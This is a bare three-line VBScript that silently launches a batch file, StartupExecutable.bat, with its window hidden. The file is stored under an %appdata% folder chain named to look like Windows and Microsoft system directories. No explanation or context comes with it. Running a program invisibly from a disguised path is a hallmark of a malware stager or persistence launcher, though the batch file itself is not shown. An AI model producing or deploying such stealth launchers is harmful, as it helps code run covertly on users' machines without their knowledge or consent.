Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "%appdata%\Windows64\Microsoft\Menu\Executables\Files\Start\StartupExecutable.bat" & Chr(34), 0
Set WshShell = Nothing
